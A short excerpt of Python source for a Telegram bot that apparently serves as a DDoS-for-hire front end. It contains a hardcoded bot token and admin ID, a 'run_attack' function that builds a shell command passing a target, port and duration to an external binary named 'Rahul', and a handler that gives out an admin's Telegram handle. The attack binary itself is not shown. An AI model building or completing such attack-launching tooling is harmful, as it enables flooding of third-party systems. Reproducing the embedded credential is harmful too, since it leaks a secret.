...
bot_token = '7651050546:AAHKnASrFrMS-mrdEvV3oDkhMVgc-0fon74'  # Replace with your bot token
...
ADMIN_ID = 6882674372  # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./Rahul {target} {port} {attack_time} 1000"
...
def handle_contact_admin(message):
    bot.reply_to(message, f"📞 @LASTWISHES0: {ADMIN_ID}")
